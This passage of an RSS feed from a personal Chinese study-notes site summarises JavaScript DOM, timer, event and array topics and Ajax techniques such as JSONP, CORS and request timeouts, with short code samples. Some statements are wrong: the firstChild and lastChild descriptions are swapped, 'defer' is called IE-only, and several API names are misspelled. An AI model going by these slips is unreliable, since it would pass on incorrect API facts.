      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/%E5%AE%9A%E6%97%B6%E5%99%A8/</guid>
      <description>定时器 定时操作的方法全是 Window 对象的方法，这些方法中的 this 都指向 Window
setIntereval() 每隔多少毫秒再循环执行一次回调函数中的代码。
需要注意，这个间隔时间一旦定义就无法被修改。
非常不准确，可以用时间戳来证明。
返回值是一个 id 数值，这个 id 作为当前定时器的唯一标识符。
// 定时器 var time = 1000; setInterval(function () { 	console.log(&amp;#39;定时器&amp;#39;); }, time); // 修改 time，虽然 time 被修改了，但定时器中的 time 依旧也是 1000 time = 10; console.log(time); clearIntereval() 清除由 setInterval() 设置的定时操作。
参数是一个数值。
var i = 0; var time = setInterval(function () { 	console.log(i++); 	if (i &amp;gt; 10) { 	clearInterval(time); 	console.log(&amp;#39;定时器已暂停&amp;#39;); 	} }, 100); setTimeout() 在指定毫秒数之后执行回调函数中的代码。回调函数中的代码只会执行因此。</description>
    </item>
    
    <item>
      <title>JavaScript 拖拽元素</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E6%8B%96%E6%8B%BD%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E6%8B%96%E6%8B%BD%E5%85%83%E7%B4%A0/</guid>
      <description>拖拽元素 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;拖拽元素&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  div {  width: 100px;  height: 100px;  background-color: rgb(15, 190, 131);   }  &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div style=&amp;#34;position:absolute;left:0;top:0;&amp;#34;&amp;gt;该拖曳只对内联样式有效&amp;lt;/div&amp;gt;  &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; JavaScrip function drag(elem) { 	var disX, disY; 	// 鼠标 	elem.</description>
    </item>
    
    <item>
      <title>JavaScript 脚本化 CSS</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%84%9A%E6%9C%AC%E5%8C%96-css/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%84%9A%E6%9C%AC%E5%8C%96-css/</guid>
      <description>脚本化 CSS 用 JavaScrip 间接操作 CSS，它是通过内联样式表去间接控制 CSS。
间接操作 CSS 时，只有ele.style.attr是读写操作，除此之外的任何操作都是只读操作。</description>
    </item>
    
    <item>
      <title>JavaScript 自动阅读</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%87%AA%E5%8A%A8%E9%98%85%E8%AF%BB/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%87%AA%E5%8A%A8%E9%98%85%E8%AF%BB/</guid>
      <description>自动阅读 JavaScrip var start = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];var stop = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];var time;// 定义一个 key，用来判断自动阅读是否暂停// 如果不加判断，setInterval() 就会被重复执行多个（导致自动阅读的速度增加），而 clearInterval() 则只能暂停第一个 setInterval()（导致自动阅读无法被暂停）var key = &amp;#39;自动阅读已暂停&amp;#39;;start.onclick = function () {// 判断自动阅读的状态if (key == &amp;#39;自动阅读已暂停&amp;#39;) {// 用 setInterval() 反复执行 scrollBy() 实现页面自动向下滚动time = setInterval(function () {window.scrollBy(0, 10);}, 100);// 自动阅读已开始key = &amp;#39;自动阅读已开始&amp;#39;;}};// 自动阅读已暂停stop.onclick = function () {clearInterval(time);key = &amp;#39;自动阅读已暂停&amp;#39;;}; </description>
    </item>
    
    <item>
      <title>JavaScript 返回父元素节点.</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%BF%94%E5%9B%9E%E7%88%B6%E5%85%83%E7%B4%A0%E8%8A%82%E7%82%B9/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E8%BF%94%E5%9B%9E%E7%88%B6%E5%85%83%E7%B4%A0%E8%8A%82%E7%82%B9/</guid>
      <description>返回父元素节点. JavaScrip function re(e, n) {  // 如果 e 不为 null 并且 n 不为 0  while (e &amp;amp;&amp;amp; n) {  // 获取当前节点的父元素  e = e.parentElement;  // 每次循环一次，则想上找一层的父元素，直到 n 为 0  n--;  }  return e }  var i = document.getElementsByTagName(&amp;#39;i&amp;#39;)[0]  var result = re(i, 3) console.log(result) </description>
    </item>
    
    <item>
      <title>JavaScript 阻止默认事件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E4%BA%8B%E4%BB%B6/</guid>
      <description>阻止默认事件 默认事件：表单提交、a 元素跳转、右键菜单等。
reture false 阻止某个对象的默认事件，只支持阻止事件句柄 onclick，不支持addEventListener()。
document.oncontextmenu = function () { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	return false; };  document.onclick = function () { 	console.log(&amp;#39;文档被点击&amp;#39;); 	return false; }; preventDefault() 阻止某个对象的默认事件，支持事件句柄，以及addEventListener()。
 document.addEventListener( 	&amp;#39;contextmenu&amp;#39;, 	function (event) {  console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.preventDefault(); 	}, 	false ); document.onconte xtmenu = function (event) { 	console.log(&amp;#39;鼠标右击事件&amp;#39;); 	event.preventDefault(); }; returnValue() 兼容 IE，与preventDefault()一样，支持阻止事件句柄、以及addEventListener()。
 document.oncontextmenu = function (event) { 	console.</description>
    </item>
    
    <item>
      <title>JavaScrip</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/javascrip/</link>
      <pubDate>Tue, 03 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/javascrip/</guid>
      <description>JavaScript JavaScrip 是单线程的语言的原因是因为 JavaScrip 需要对 HTML 页面进行操作，无法一边操作 HTML 文档，一边又加载 HTML 文档。</description>
    </item>
    
    <item>
      <title>JavaScrip 异步加载 JS</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-js/</link>
      <pubDate>Tue, 03 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD-js/</guid>
      <description>异步加载 JS 有时候，我们需要加载一些工具包，这些工具包与加载 HTML 文档无关，因此，我们就需要异步加载 JavaScrip，即实现 JavaScrip 的多线程。
aysnc=&amp;ldquo;aysnc&amp;rdquo; 异步加载，加载 JavaScrip 文件完就执行，aysnc 只能加载外部 JavaScrip，并不能将 JavaScrip 代码写到 script 元素中。
defer = &amp;ldquo;defer&amp;rdquo; 异步加载，即一边加载 JavaScrip 文件，一边加载 HTML 文档，但是，它需要等 DOM 文档解析完毕后，才会执行其中的 JavaScrip 代码，相当于window.onload，IE 独有。
可以将JavaScrip 代码写到 script 元素中。
&amp;lt;script src=&amp;#34;vue.js&amp;#34; defer=&amp;#34;defer&amp;#34;&amp;gt;  console.log(&amp;#39;IE 异步加载&amp;#39;)  &amp;lt;/script&amp;gt; 按需异步加载 JS 当我们用创建一个 script 元素，那么需要将它插入到页面中，才会执行这个 JavaScrip 文件。如果不插入的话，仅仅只执行加载这个JavaScrip 文件，这样，我们就实现了一个异步加载 JavaScrip 的过程。
因为加载 JavaScrip 文件需要一个过程，而程序执行代码的时候，并不会等 main.js 文件下载完毕才继续执行后续代码，因此，这时候如果立即执行 main.js 中的某个方法，会报错。
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>JavaScrip 异步和同步</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Tue, 03 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%90%8C%E6%AD%A5/</guid>
      <description>异步和同步 同步 异步 异步是目的，多线程是手段。
异步是和同步相对的。同步即阻塞，也即在做A的时候做不了B，AB可以同时做互不干扰就叫异步。为了实现异步，可以利用多线程。</description>
    </item>
    
    <item>
      <title>JavaScrip 浏览器渲染页面</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Tue, 03 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E9%A1%B5%E9%9D%A2/</guid>
      <description>浏览器渲染页面 构建 DOM 树 解析 DOM 节点，将 HTML 元素以树形结构（二叉树）的方式添加到 DOM 树上，解析的时候只解析节点本身，不解析节点的属性或其包含的文本。
此时还未加载 DOM 树，仅仅只是解析 DOM 节点。
构建 CSS 树 构建 Render 树 DOMTree + CSSTree = RenderTree
RenderTree 构建完成之后，浏览器渲染引擎才正式开始绘制页面
reFlow 该过程需要重新构建整个文档，非常浪费性能。
指的是网络浏览器为了重新渲染部分或全部的文档而重新计算文档中元素的位置和几何结构的过程。例如 dom 节点的删除与添加、dom 节点的宽高发生变化、节点的位置变变化等。
repaint 该过程只重新绘制部分元素。
一个元素的外观的改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。例如改变 vidibility、outline、背景色等属性。
节点布局 页面渲染 </description>
    </item>
    
    <item>
      <title>JavaScrip 表达式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Tue, 03 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>表达式 表达式是一组代码的集合，它会返回一个值。
JavaScript 有以下表达式类型：
 算数：得出一个数字，例如 3.14159. 字符串：得出一个字符串, 例如 &amp;ldquo;Fred&amp;rdquo; 或 &amp;ldquo;234&amp;rdquo;. 逻辑值：得出 true 或者 false。 基本表达式：javascript 中基本的关键字和一般表达式。 左值表达式：分配给左值。  </description>
    </item>
    
    <item>
      <title>JavaScript Array 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/array/array-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 02 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/array/array-%E6%96%B9%E6%B3%95/</guid>
      <description>Array 方法 splice(start,deleteCount,item&amp;hellip;) 从数组的索引 start 开始删除 deleteCount 个元素，并在索引为 start 的地方添加若干个 item 元素，并返回一个新数组。
此方法会改变原数组。
shift() 删除数组的第一个元素，并返回该元素的值。
此方法会改变原数组。
unshift() 将一个或多个元素添加到数组的开头，并返回该数组的新长度，该方法会修改原有数组。
filter() 用于对数组进行过滤，它返回一个过滤后的数组，如果没有任何数组元素通过测试，则返回空数组。
filter()不会对空数组进行检测，不会改变原始数组。
sort() 用原地算法对数组的元素进行排序，并返回数组。
此方法会改变原数组。
它的参数为一个回调函数compareFunction，该回调函数有a、b两个参数，它们分别代表数组中当前进行比较的两个元素：
a 表示在后的那个元素。
b 表示在前的那个元素
数字升序：
var arr = [5, 3, 9, 2, 5, 1, 7]; var result = arr.sort(function (a, b) { 	return a - b; });  console.log(arr); 数字降序：
var arr = [5, 3, 9, 2, 5, 1, 7]; var result = arr.sort(function (a, b) { 	return b - a; });  console.</description>
    </item>
    
    <item>
      <title>JavaScript Element 属性</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/element-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Mon, 02 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/element-%E5%B1%9E%E6%80%A7/</guid>
      <description>Element 属性 innerHTML 设置或返回指定元素的内容。返回的内容包含这个元素所包含的子元素以及文本信息。
它会解析 HTML 结构。
设置元素内容的时候，如果元素内容中有子元素，则这些子元素也会被覆盖。
可以在元素内容的后面追加新内容。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; // 设置内容 div.innerHTML = &amp;#39;123&amp;#39;; // 追加内容 div.innerHTML += &amp;#39;456&amp;#39;; // 写入 html 元素 div.innerHTML += &amp;#39;&amp;lt;span&amp;gt;写入的元素&amp;lt;/span&amp;gt;&amp;#39;; childElementCount 返回指定元素节点的子元素节点的个数，不包含子元素节点的子元素节点。
firstElementChild 返回指定元素节点的第一个元素节点。
lastElementChild 返回指定元素节点的最后一个元素节点。
children 返回当前元素节点的所有子元素节点，不包含子元素节点的子元素节点。</description>
    </item>
    
    <item>
      <title>JavaScript Element 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/element-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 02 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/element-%E6%96%B9%E6%B3%95/</guid>
      <description>Element 方法 setAttribute() 设置指定元素的属性和属性的值。设置的属性名可以是自定义的属性。
如果这个指定的属性已存在，则仅更改值。
getAttribute() 返回指定属性名的属性值。
getBoundingClientRect() 返回元素的尺寸，以及相对于视口的位置。
如果是标准盒子模型，元素的宽高等于width/height + padding + border-width的总和。如果box-sizing: border-box，元素的宽高等于 width/height。
返回的结果不是事实的，是静态的。
var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; var ele = div.getBoundingClientRect(); </description>
    </item>
    
    <item>
      <title>JavaScript Node 属性</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/node/node-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Mon, 02 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/node/node-%E5%B1%9E%E6%80%A7/</guid>
      <description>Node 属性 用来遍历节点树。
parentElement 返回当前元素节点的父元素节点。
parentNode 返回指定节点的父节点，一个节点的父节点只有一个。
childNodes 返回指定节点所包含的所有子节点。
firstChild 返回指定节点所包含的最后一个节点
lastChild 返回指定节点所包含的第一个节点
nextSibling 返回在指定节点后面的兄弟节点，如果指定节点为最后一个节点，则返回 null。
previousSibling 返回在指定节点前面的兄弟节点，如果指定节点为第一个节点，则返回 null。</description>
    </item>
    
    <item>
      <title>JavaScript 操作节点</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/%E6%93%8D%E4%BD%9C%E8%8A%82%E7%82%B9/</link>
      <pubDate>Mon, 02 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/%E6%93%8D%E4%BD%9C%E8%8A%82%E7%82%B9/</guid>
      <description>操作节点 增加节点 createElement() 创建一个元素节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var div = document.createElement(&amp;#39;div&amp;#39;) createTextNod() 创建一个文本节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var text = document.createTextNode(&amp;#39;我是文本节点&amp;#39;) createComment() 创建一个文本节点，但还没有插入到文档中，需要用 appendChild() 将元素插入到文档中。
var comment = document.createComment(&amp;#39;我是一个注释&amp;#39;) createDocumentFragment(&amp;rsquo;&#39;) 创建了一虚拟的节点对象，也可以说是创建一个文档碎片
var fragment = document.createDocumentFragment(&amp;#39;&amp;#39;) 插入节点 ele.appendChild(subEle) 在 ele 节点的最后一个子节点之后添加 subEle 节点。
如果 subEle 节点已经在文档中存在，那么会将 subEle 节点移动到 ele 节点中。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.createElement(&amp;#39;div&amp;#39;); var text = document.createTextNode(&amp;#39;插入的文本&amp;#39;); body.appendChild(div); div.appendChild(text); ele.insertBefore(subEleOne,subEleTwo) 在 ele 节点的子节点 subEleTwo 之前插入一个subEleOne 节点。
var body = document.</description>
    </item>
    
    <item>
      <title>JavaScript 类数组</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/array/%E7%B1%BB%E6%95%B0%E7%BB%84/</link>
      <pubDate>Mon, 02 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/array/%E7%B1%BB%E6%95%B0%E7%BB%84/</guid>
      <description>类数组 类数组是可以当作数组来使用的对象
类数组虽然在写法上跟数组一样，但它实际上是 object，且数组能调用的方法它都不能调用的数组。
比如 arguments，函数的第一个参数是 argument[0]，写法上跟数组一样，但是不是数组，它的原型是 Object，它也不能调用数组的一些方法。
特点 具有对象和数组的特性，既可以当作对象来用，也可以当作数组来用（并不是所有的数组方法都能使用，可以自己手动添加）
数据位 存在于数组索引位上的数据。</description>
    </item>
    
    <item>
      <title>Ajax IE 缓存问题</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/ie-%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/ie-%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/</guid>
      <description>Ajax IE 缓存问题 IE 浏览器会会对Ajax 请求的的结果进行缓存，这会导致下次请求服务器的时候，使用的是本地的缓存，而不是服务器响应的最新数据，这会对一些时效性比较强的一些场景产生影响。
JavaScript 在 open 方法种中的 url 路径中加上一个参数...?t=&#39; + Date.now()即可。该值是获取当前时间戳。
const div = document.getElementById(&amp;#39;result&amp;#39;); const btn = document.getElementById(&amp;#39;btn&amp;#39;); btn.onclick = function () {  const xhr = new XMLHttpRequest();  // 获取时间戳，解决IE 浏览器缓存的问题  xhr.open(&amp;#39;POST&amp;#39;, &amp;#39;http://localhost:8000/ie?t=&amp;#39; + Date.now())  xhr.setRequestHeader(&amp;#39;Content-Type&amp;#39;, &amp;#39;application/x-www-form-urlencoded&amp;#39;)  xhr.setRequestHeader(&amp;#39;name&amp;#39;, &amp;#39;Rainy&amp;#39;)  xhr.send(&amp;#39;a=100&amp;amp;b=200&amp;#39;);  xhr.onreadystatechange = function () {  if (xhr.readyState == 4) {  if (xhr.status &amp;gt;= 200 &amp;amp;&amp;amp; xhr.status &amp;lt; 300) {  div.</description>
    </item>
    
    <item>
      <title>Ajax Jsonp 实现原理</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/jsonp-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/jsonp-%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</guid>
      <description>Jsonp 实现原理 script标签本身具有跨域的特性，JSONP 借助这个特定来解决的跨域问题。
服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/jsonp&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 定义数据  const data = {  name: &amp;#34;Rainy&amp;#34;  }  // 将数据转为字符串  let str = JSON.stringify(data)  // 响应结果，一个函数调用，函数已经在前端提前声明  response.end(`handle(${str})`); })  app.listen(port, () =&amp;gt; {  console.</description>
    </item>
    
    <item>
      <title>Ajax POST 请求</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/post-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/post-%E8%AF%B7%E6%B1%82/</guid>
      <description>POST 请求 使用 POST 的方式向服务端发送一个请求。
服务端 const express = require(&amp;#39;express&amp;#39;) const app = express() const port = 8000 // 创建路由规则，允许所有方式的请求 app.all(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  response.send(&amp;#39;Hello World! POST&amp;#39;) })  app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;  &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;./css/main.css&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;POST 请求&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;button id=&amp;#34;btn&amp;#34;&amp;gt;点击按钮，发送q&amp;lt;/button&amp;gt;  &amp;lt;div id=&amp;#34;result&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;   &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;.</description>
    </item>
    
    <item>
      <title>Ajax 手动取消请求</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E6%89%8B%E5%8A%A8%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E6%89%8B%E5%8A%A8%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</guid>
      <description>手动取消请求 服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 设置延时响应  setTimeout(() =&amp;gt; {  response.send(&amp;#39;Hello IE&amp;#39;);  }, 1000) }) app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 请求超时设置</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE/</guid>
      <description>请求超时设置 服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  // 针对 ie 缓存的设置 app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 设置延时响应  setTimeout(() =&amp;gt; {  response.send(&amp;#39;Hello IE&amp;#39;);  }, 3000) })   app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 跨域</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/%E8%B7%A8%E5%9F%9F/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/%E8%B7%A8%E5%9F%9F/</guid>
      <description>跨域 同源策略 同源策略是一种出于浏览器安全方面的考虑而出台的一种策略，它可以保证用户信息的安全，防止恶意的网站窃取。同源策略只允许与本域下的接口交互，不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。
同源：同协议、同域名、同端口，必须完全相同，违背同源策略，就是跨域。
同源策略的限制范围  Cookie，localStorage，IndexDB 无法读取 DOM 无法获得 AJAX 请求不能发送  如何解决跨域问题 JSONP JSONP 是浏览器与客户端跨域通信常用的一种方法。
script标签本身具有跨域的特性，JSONP 就是借助这个特定来解决跨域的问题的。
CORS CORS的全称是跨源资源共享，是一种 ajax 跨域请求资源的方式.
// * 表示所有网站都可以跨域请求当前服务器 response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;) // 也可以只有某个网站才能对服务器发送跨域请求  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;yxzi.xyz&amp;#39;) </description>
    </item>
    
    <item>
      <title>Ajax 重复发送请求的问题</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E9%87%8D%E5%A4%8D%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E9%87%8D%E5%A4%8D%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
      <description>重复发送请求的问题 当用户重复发送同一个请求的时候，我们为了服务器的效率考虑，需要将之前发送的请求取消掉，只发送一个最新的请求，这样，服务器所受到的压力就要小很多。
